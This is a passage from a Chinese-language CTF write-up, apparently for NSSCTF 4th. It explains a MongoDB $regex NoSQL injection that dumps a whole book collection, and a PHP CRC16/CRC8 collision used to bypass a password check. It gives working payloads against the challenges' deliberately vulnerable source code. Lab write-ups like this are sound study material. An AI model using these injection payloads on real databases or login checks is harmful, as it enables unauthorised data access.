+</span></span><span class="line"><span class="cl">print(book2)</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>通过 <code>$regex</code> 正则匹配所有字符串，取出所有数据，看到所有数据都出来了
+<figure>
+  <img src="file-20250824224706281.png" alt="" loading="lazy"></figure>
+
+回到题目，逻辑很简单，接收 JSON 字符串，取出 title 键的值，如果值类型为字典则不执行 sanitize() 正则替换操作，直接添加进 query 变量 <code>$and</code> 键值</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">query = {&#34;$and&#34;: []}
+</span></span><span class="line"><span class="cl">books = []
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def sanitize(input_str: str) -&gt; str:
+</span></span><span class="line"><span class="cl">    return re.sub(r&#39;[^a-zA-Z0-9\s]&#39;, &#39;&#39;, input_str)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def search():
+</span></span><span class="line"><span class="cl">	...
+</span></span><span class="line"><span class="cl">		data = request.get_json(force=True)
+</span></span><span class="line"><span class="cl">		title = data.get(&#34;title&#34;)
+</span></span><span class="line"><span class="cl">		author = data.get(&#34;author&#34;)
+</span></span><span class="line"><span class="cl">		if isinstance(title, str):
+</span></span><span class="line"><span class="cl">			title = sanitize(title)
+</span></span><span class="line"><span class="cl">			query[&#34;$and&#34;].append({&#34;title&#34;: title})
+</span></span><span class="line"><span class="cl">		elif isinstance(title, dict):
+</span></span><span class="line"><span class="cl">			query[&#34;$and&#34;].append({&#34;title&#34;: title})</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>然后就进行查询处理，并将数据返回给前端，相当于 SQL 注入中没有做任何处理，直接能查集合所有数据</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">if query[&#34;$and&#34;]:
+</span></span><span class="line"><span class="cl">	books = list(books_collection.find(query))
+</span></span><span class="line"><span class="cl">	return jsonify([
+</span></span><span class="line"><span class="cl">		{&#34;title&#34;: b.get(&#34;title&#34;), &#34;author&#34;: b.get(&#34;author&#34;), &#34;description&#34;: b.get(&#34;description&#34;)} for b in books
+</span></span><span class="line"><span class="cl">	])</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>payload</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Content-Type: application/json
+</span></span><span class="line"><span class="cl">{&#34;title&#34;: {&#34;$regex&#34;: &#34;.*&#34;}}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250824230514686.png" alt="" loading="lazy"></figure>
+</p>
+<h2 class="heading-element" id="ezcrc"><span><code>EzCRC</code></span>
+  <a href="#ezcrc" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>源码</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="3" style="--fi-max-shown-lines:30;--fi-line-digit:3;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">compute_crc16</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$checksum</span> <span class="o">=</span> <span class="mh">0xFFFF</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$checksum</span> <span class="o">^=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="nv">$j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$checksum</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$checksum</span> <span class="o">=</span> <span class="p">((</span><span class="nv">$checksum</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xA001</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$checksum</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$checksum</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">calculate_crc8</span><span class="p">(</span><span class="nv">$input</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">static</span> <span class="nv">$crc8_table</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x2A</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x7E</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x4F</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x5D</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0xE0</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xDF</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x8C</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0xA8</span><span class="p">,</span> <span class="mh">0xAF</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0xB4</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0xBA</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0xDC</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0xF6</span><span class="p">,</span> <span class="mh">0xE3</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0xB7</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0xBE</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0xAC</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0xA2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x8E</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0xB1</span><span class="p">,</span> <span class="mh">0xB6</span><span class="p">,</span> <span class="mh">0xBF</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0xA4</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0xC8</span><span class="p">,</span> <span class="mh">0xDD</span><span class="p">,</span> <span class="mh">0xDA</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x7B</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x3D</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x4E</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x7F</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0x6D</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x1A</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0xA9</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0xA7</span><span class="p">,</span> <span class="mh">0xB2</span><span class="p">,</span> <span class="mh">0xB5</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x8A</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0xD7</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0xF3</span>
+</span></span><span class="line"><span class="cl">    <span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$bytes</span> <span class="o">=</span> <span class="nx">unpack</span><span class="p">(</span><span class="s1">&#39;C*&#39;</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$length</span> <span class="o">=</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$crc</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$k</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$k</span> <span class="o">&lt;=</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$k</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$crc</span> <span class="o">=</span> <span class="nv">$crc8_table</span><span class="p">[(</span><span class="nv">$crc</span> <span class="o">^</span> <span class="nv">$bytes</span><span class="p">[</span><span class="nv">$k</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$crc</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$SECRET_PASS</span> <span class="o">=</span> <span class="s2">&#34;Enj0yNSSCTF4th!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$SECRET_PASS</span><span class="p">)</span> <span class="o">==</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$correct_pass_crc16</span> <span class="o">=</span> <span class="nx">compute_crc16</span><span class="p">(</span><span class="nv">$SECRET_PASS</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$correct_pass_crc8</span> <span class="o">=</span> <span class="nx">calculate_crc8</span><span class="p">(</span><span class="nv">$SECRET_PASS</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$user_input</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$user_pass_crc16</span> <span class="o">=</span> <span class="nx">compute_crc16</span><span class="p">(</span><span class="nv">$user_input</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$user_pass_crc8</span> <span class="o">=</span> <span class="nx">calculate_crc8</span><span class="p">(</span><span class="nv">$user_input</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$SECRET_PASS</span> <span class="o">===</span> <span class="nv">$user_input</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;这样不行&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$correct_pass_crc16</span> <span class="o">!==</span> <span class="nv">$user_pass_crc16</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;这样也不行&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$correct_pass_crc8</span> <span class="o">!==</span> <span class="nv">$user_pass_crc8</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;这样还是不行吧&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$granted_access</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$granted_access</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;都到这份上了,flag就给你了: </span><span class="si">$FLAG</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;不不不&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;再试试&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>传参值 CRC16 和 CRC8 与内置密钥 <code>Enj0yNSSCTF4th!</code>的 CRC16 和 CRC8 加密密文进行对比，传值不能相等，加密后密文必须相等</p>
+<p>这题真不会考什么密码，但估计考的也不能难，AI 直接嗦了 :(不是</p>
+<p>赛后复盘，这题我也没太多头绪</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">pass=Enj0yNSSCTF4%7B(%25</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250824162648756.png" alt="" loading="lazy"></figure>
+</p>
+<h2 class="heading-element" id="mpgafilesystem"><span><code>[mpga]filesystem</code></span>
+  <a href="#mpgafilesystem" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>源码</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="3" style="--fi-max-shown-lines:30;--fi-line-digit:3;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
